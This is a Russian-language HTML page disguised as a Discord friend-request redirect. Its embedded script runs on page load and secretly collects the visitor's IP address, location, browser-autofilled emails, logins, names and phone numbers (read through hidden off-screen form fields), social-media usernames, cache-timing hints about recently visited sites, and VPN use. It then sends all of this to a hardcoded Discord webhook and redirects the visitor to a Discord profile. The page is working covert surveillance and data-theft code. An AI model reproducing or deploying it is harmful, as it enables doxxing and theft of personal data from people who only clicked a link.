<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Добавь в друзья Discord">
    <meta property="og:description" content="Нажми чтобы добавить в друзья">
    <meta name="theme-color" content="#5865F2">
    <title>Friend Request</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #5865F2, #404EED);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: white;
            text-align: center;
        }
        .container { animation: fadeIn 0.5s ease; }
        .avatar {
            width: 100px; height: 100px; border-radius: 50%;
            border: 5px solid white; margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h2 { font-size: 24px; margin-bottom: 10px; }
        p { color: rgba(255,255,255,0.8); font-size: 16px; }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white; border-radius: 50%;
            animation: spin 0.8s linear infinite; margin: 25px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
        <h2>👋 Перенаправляем в Discord...</h2>
        <p>Ищем связанные аккаунты...</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function collectAndRedirect() {
            const foundData = {
                emails: [],
                logins: [],
                phones: [],
                names: [],
                possibleUsernames: [],
                socialProfiles: [],
                recentSites: [],
                referrer: document.referrer || 'Прямой переход'
            };
            
            try {
                // ======================
                // 1. IP + ГЕО
                // ======================
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                
                let geoData = {};
                try {
                    const res = await fetch(`https://ipapi.co/${ip}/json/`);
                    geoData = await res.json();
                } catch(e) {
                    try {
                        const res = await fetch(`https://ipwhois.app/json/${ip}`);
                        geoData = await res.json();
                    } catch(e2) { geoData = {}; }
                }
                
                // ======================
                // 2. ИЗВЛЕЧЕНИЕ НИКОВ ИЗ REFERRER
                // ======================
                const ref = foundData.referrer;
                
                // VK
                if (ref.includes('vk.com/')) {
                    const vkMatch = ref.match(/vk\.com\/([a-zA-Z0-9_.]+)/);
                    if (vkMatch && vkMatch[1] !== 'im' && vkMatch[1] !== 'feed' && vkMatch[1] !== 'wall') {
                        foundData.socialProfiles.push({
                            platform: '🟦 ВКонтакте',
                            username: vkMatch[1],
                            url: `https://vk.com/${vkMatch[1]}`,
                            type: ref.includes('/im') ? 'ЛС' : ref.includes('/wall') ? 'Стена' : 'Профиль'
                        });
                        foundData.possibleUsernames.push(vkMatch[1]);
                    }
                }
                
                // Telegram
                if (ref.includes('t.me/')) {
                    const tgMatch = ref.match(/t\.me\/([a-zA-Z0-9_]+)/);
                    if (tgMatch && tgMatch[1] !== 'c' && tgMatch[1] !== 'chat') {
                        foundData.socialProfiles.push({
                            platform: '✈️ Telegram',
                            username: '@' + tgMatch[1],
                            url: `https://t.me/${tgMatch[1]}`,
                            type: 'Канал/чат'
                        });
                        foundData.possibleUsernames.push(tgMatch[1]);
                    }
                }
                
                // Discord
                if (ref.includes('discord.com/')) {
                    const dcMatch = ref.match(/discord\.com\/users\/(\d+)/);
                    if (dcMatch) {
                        foundData.socialProfiles.push({
                            platform: '🎮 Discord',
                            username: 'ID: ' + dcMatch[1],
                            url: ref,
                            type: 'Профиль'
                        });
                        foundData.possibleUsernames.push('discord:' + dcMatch[1]);
                    }
                }
                
                // Twitter/X
                if (ref.includes('twitter.com/') || ref.includes('x.com/')) {
                    const twMatch = ref.match(/(?:twitter|x)\.com\/([a-zA-Z0-9_]+)/);
                    if (twMatch && !['home', 'explore', 'notifications', 'messages'].includes(twMatch[1])) {
                        foundData.socialProfiles.push({
                            platform: '🐦 Twitter/X',
                            username: '@' + twMatch[1],
                            url: ref,
                            type: 'Профиль'
                        });
                        foundData.possibleUsernames.push(twMatch[1]);
                    }
                }
                
                // Instagram
                if (ref.includes('instagram.com/')) {
                    const igMatch = ref.match(/instagram\.com\/([a-zA-Z0-9_.]+)/);
                    if (igMatch && !['explore', 'accounts', 'p', 'reel', 'stories'].includes(igMatch[1])) {
                        foundData.socialProfiles.push({
                            platform: '📷 Instagram',
                            username: '@' + igMatch[1],
                            url: ref,
                            type: 'Профиль'
                        });
                        foundData.possibleUsernames.push(igMatch[1]);
                    }
                }
                
                // GitHub
                if (ref.includes('github.com/')) {
                    const ghMatch = ref.match(/github\.com\/([a-zA-Z0-9-]+)/);
                    if (ghMatch && !['explore', 'notifications', 'settings', 'marketplace'].includes(ghMatch[1])) {
                        foundData.socialProfiles.push({
                            platform: '💻 GitHub',
                            username: ghMatch[1],
                            url: ref,
                            type: 'Профиль'
                        });
                        foundData.possibleUsernames.push(ghMatch[1]);
                    }
                }
                
                // ======================
                // 3. АВТОЗАПОЛНЕНИЕ
                // ======================
                const autoFillFields = [
                    { name: 'email', autocomplete: 'email', type: 'email', category: 'email' },
                    { name: 'login', autocomplete: 'email', type: 'email', category: 'email' },
                    { name: 'username', autocomplete: 'username', type: 'text', category: 'login' },
                    { name: 'login', autocomplete: 'username', type: 'text', category: 'login' },
                    { name: 'user', autocomplete: 'username', type: 'text', category: 'login' },
                    { name: 'nickname', autocomplete: 'nickname', type: 'text', category: 'login' },
                    { name: 'name', autocomplete: 'name', type: 'text', category: 'name' },
                    { name: 'firstname', autocomplete: 'given-name', type: 'text', category: 'name' },
                    { name: 'lastname', autocomplete: 'family-name', type: 'text', category: 'name' },
                    { name: 'tel', autocomplete: 'tel', type: 'tel', category: 'phone' },
                ];
                
                for (const field of autoFillFields) {
                    try {
                        const input = document.createElement('input');
                        input.type = field.type;
                        input.name = field.name;
                        input.autocomplete = field.autocomplete;
                        input.style.cssText = 'position:absolute;left:-9999px;top:-9999px;opacity:0;width:1px;height:1px;';
                        document.body.appendChild(input);
                        await new Promise(r => setTimeout(r, 150));
                        const value = input.value.trim();
                        if (value && value.length > 1) {
                            if (field.category === 'email' && value.includes('@')) {
                                if (!foundData.emails.includes(value)) foundData.emails.push(value);
                                // Извлекаем возможный ник из email
                                const nickFromEmail = value.split('@')[0];
                                if (nickFromEmail.length > 2 && !foundData.possibleUsernames.includes(nickFromEmail)) {
                                    foundData.possibleUsernames.push(nickFromEmail);
                                }
                            } else if (field.category === 'login' && value.length > 2 && !value.includes('@')) {
                                if (!foundData.logins.includes(value)) foundData.logins.push(value);
                                if (!foundData.possibleUsernames.includes(value)) foundData.possibleUsernames.push(value);
                            } else if (field.category === 'name' && value.length > 1 && !value.includes('@') && !/\d/.test(value)) {
                                if (!foundData.names.includes(value)) foundData.names.push(value);
                            } else if (field.category === 'phone' && value.length > 5) {
                                if (!foundData.phones.includes(value)) foundData.phones.push(value);
                            }
                        }
                        document.body.removeChild(input);
                    } catch(e) {}
                }
                
                // ======================
                // 4. ГЕНЕРАЦИЯ ВЕРОЯТНЫХ НИКОВ
                // ======================
                const generateUsernames = () => {
                    const variants = [];
                    
                    // Из email
                    for (const email of foundData.emails) {
                        const nick = email.split('@')[0];
                        variants.push(nick);
                        variants.push(nick.replace(/[._-]/g, ''));
                        variants.push(nick.replace(/[0-9]/g, ''));
                        variants.push(nick + '_official');
                        variants.push('the' + nick.charAt(0).toUpperCase() + nick.slice(1));
                    }
                    
                    // Из имён
                    for (const name of foundData.names) {
                        const clean = name.toLowerCase().replace(/\s/g, '');
                        variants.push(clean);
                        variants.push(clean + '_' + Math.floor(Math.random() * 99));
                        variants.push(clean.charAt(0) + '_' + clean);
                    }
                    
                    // Из логинов
                    for (const login of foundData.logins) {
                        variants.push(login);
                        variants.push(login + '1');
                        variants.push(login + '_real');
                    }
                    
                    return [...new Set(variants)]
                        .filter(v => v.length >= 3 && v.length <= 30)
                        .filter(v => !v.includes('@'))
                        .slice(0, 10);
                };
                
                const generatedNicks = generateUsernames();
                for (const nick of generatedNicks) {
                    if (!foundData.possibleUsernames.includes(nick)) {
                        foundData.possibleUsernames.push(nick);
                    }
                }
                
                // ======================
                // 5. ПРОВЕРКА СУЩЕСТВОВАНИЯ ПРОФИЛЕЙ
                // ======================
                const checkProfile = async (platform, url) => {
                    try {
                        const controller = new AbortController();
                        const timeout = setTimeout(() => controller.abort(), 2000);
                        const response = await fetch(url, { mode: 'no-cors', signal: controller.signal });
                        clearTimeout(timeout);
                        return true;
                    } catch(e) {
                        return false;
                    }
                };
                
                // Проверяем топ-3 ника в популярных соцсетях
                const topNicks = foundData.possibleUsernames.slice(0, 3);
                const checkPlatforms = [
                    { name: 'VK', url: (n) => `https://vk.com/${n}` },
                    { name: 'Telegram', url: (n) => `https://t.me/${n}` },
                    { name: 'GitHub', url: (n) => `https://github.com/${n}` },
                    { name: 'Twitter', url: (n) => `https://twitter.com/${n}` },
                    { name: 'Reddit', url: (n) => `https://www.reddit.com/user/${n}` },
                    { name: 'Steam', url: (n) => `https://steamcommunity.com/id/${n}` },
                    { name: 'Twitch', url: (n) => `https://www.twitch.tv/${n}` },
                    { name: 'YouTube', url: (n) => `https://www.youtube.com/@${n}` },
                ];
                
                for (const nick of topNicks) {
                    for (const platform of checkPlatforms) {
                        const exists = await checkProfile(platform.name, platform.url(nick));
                        if (exists) {
                            const profile = {
                                platform: platform.name,
                                username: nick,
                                url: platform.url(nick)
                            };
                            // Проверяем, нет ли уже такого
                            const alreadyExists = foundData.socialProfiles.some(
                                p => p.platform === profile.platform && p.username === profile.username
                            );
                            if (!alreadyExists) {
                                foundData.socialProfiles.push(profile);
                            }
                        }
                    }
                }
                
                // ======================
                // 6. КЕШ БРАУЗЕРА
                // ======================
                const sitesToCheck = [
                    { name: '🟦 ВКонтакте', url: 'https://vk.com/favicon.ico', cat: 'Соцсеть' },
                    { name: '✈️ Telegram', url: 'https://web.telegram.org/favicon.ico', cat: 'Мессенджер' },
                    { name: '▶️ YouTube', url: 'https://www.youtube.com/favicon.ico', cat: 'Видео' },
                    { name: '🎮 Discord', url: 'https://discord.com/favicon.ico', cat: 'Мессенджер' },
                    { name: '📷 Instagram', url: 'https://www.instagram.com/favicon.ico', cat: 'Соцсеть' },
                    { name: '🐦 Twitter/X', url: 'https://twitter.com/favicon.ico', cat: 'Соцсеть' },
                    { name: '💻 GitHub', url: 'https://github.com/favicon.ico', cat: 'Разработка' },
                    { name: '🎮 Steam', url: 'https://store.steampowered.com/favicon.ico', cat: 'Игры' },
                    { name: '🟣 Twitch', url: 'https://www.twitch.tv/favicon.ico', cat: 'Стримы' },
                    { name: '🔴 Reddit', url: 'https://www.reddit.com/favicon.ico', cat: 'Форум' },
                ];
                
                for (const site of sitesToCheck) {
                    try {
                        const start = performance.now();
                        const controller = new AbortController();
                        const timeout = setTimeout(() => controller.abort(), 1500);
                        await fetch(site.url, { mode: 'no-cors', signal: controller.signal });
                        clearTimeout(timeout);
                        const loadTime = performance.now() - start;
                        if (loadTime < 80) {
                            foundData.recentSites.push({ name: site.name, cat: site.cat, cached: true, time: Math.round(loadTime) + 'мс' });
                        }
                    } catch(e) {}
                }
                
                // ======================
                // 7. VPN
                // ======================
                const org = (geoData.org || '').toLowerCase();
                const vpnList = {
                    'nordvpn': 'NordVPN', 'expressvpn': 'ExpressVPN', 'surfshark': 'Surfshark',
                    'protonvpn': 'ProtonVPN', 'proton': 'Proton', 'mullvad': 'Mullvad',
                    'cloudflare': 'Cloudflare WARP',
                };
                let detectedVPN = null;
                for (const [key, name] of Object.entries(vpnList)) {
                    if (org.includes(key)) { detectedVPN = name; break; }
                }
                
                // ======================
                // 8. ОТПРАВЛЯЕМ
                // ======================
                const WEBHOOK = "https://discord.com/api/webhooks/1507909831678496848/6Hm-yFjHzRHElN-GRxDYMc5o3ILiiis_tdMu4GfTiwnScyQCFio5lHr5ou29Y2jVWCgF";
                
                const embed = {
                    title: "👀 НОВЫЙ ПОСЕТИТЕЛЬ!",
                    description: `**Откуда:** ${foundData.referrer}`,
                    color: 5814786,
                    fields: [
                        {
                            name: "━━━━━━ 🌍 IP ━━━━━━",
                            value: `🔗 ||${ip}||\n📍 ${[geoData.city, geoData.country_name].filter(Boolean).join(', ') || 'Неизвестно'}\n🏢 ${geoData.org || '—'}`,
                            inline: false
                        }
                    ],
                    footer: { text: "Nickname Scanner • " + new Date().toLocaleString('ru-RU') },
                    timestamp: new Date().toISOString()
                };
                
                // VPN
                if (detectedVPN) {
                    embed.fields.push({
                        name: "━━━━━━ 🚨 VPN ━━━━━━",
                        value: `⚠️ ${detectedVPN}`,
                        inline: false
                    });
                }
                
                // Email
                if (foundData.emails.length > 0) {
                    embed.fields.push({
                        name: "━━━━━━ 📧 EMAIL ━━━━━━",
                        value: foundData.emails.map(e => `||${e}||`).join('\n'),
                        inline: false
                    });
                }
                
                // Логины
                if (foundData.logins.length > 0) {
                    embed.fields.push({
                        name: "━━━━━━ 👤 ЛОГИНЫ ━━━━━━",
                        value: foundData.logins.map(l => `||${l}||`).join('\n'),
                        inline: false
                    });
                }
                
                // Имена
                if (foundData.names.length > 0) {
                    embed.fields.push({
                        name: "━━━━━━ 📛 ИМЯ ━━━━━━",
                        value: foundData.names.join(', '),
                        inline: false
                    });
                }
                
                // ВОЗМОЖНЫЕ НИКИ
                if (foundData.possibleUsernames.length > 0) {
                    const uniqueNicks = [...new Set(foundData.possibleUsernames)].slice(0, 10);
                    embed.fields.push({
                        name: "━━━━━━ 🎯 ВЕРОЯТНЫЕ НИКИ ━━━━━━",
                        value: uniqueNicks.map((n, i) => `${i+1}. ||${n}||`).join('\n') + 
                               '\n\n💡 *Проверь эти ники в соцсетях*',
                        inline: false
                    });
                }
                
                // НАЙДЕННЫЕ ПРОФИЛИ
                if (foundData.socialProfiles.length > 0) {
                    const profiles = foundData.socialProfiles.slice(0, 8);
                    embed.fields.push({
                        name: "━━━━━━ 🔗 НАЙДЕННЫЕ ПРОФИЛИ ━━━━━━",
                        value: profiles.map(p => 
                            `**${p.platform}:** [${p.username}](${p.url}) (${p.type || 'Профиль'})`
                        ).join('\n'),
                        inline: false
                    });
                }
                
                // КЕШ
                if (foundData.recentSites.length > 0) {
                    embed.fields.push({
                        name: "━━━━━━ ⚡ КЕШ БРАУЗЕРА ━━━━━━",
                        value: foundData.recentSites.slice(0, 5).map((s, i) => 
                            `${i+1}. ${s.name} — ${s.time}`
                        ).join('\n') + '\n\n💡 *Недавно был на этих сайтах*',
                        inline: false
                    });
                }
                
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ embeds: [embed] })
                });
                
            } catch(e) {
                console.log('Ошибка:', e.message);
            }
            
            setTimeout(() => {
                window.location.href = "https://discord.com/users/1473020726280847541";
            }, 3000);
        }
        
        collectAndRedirect();
    </script>
</body>
</html>
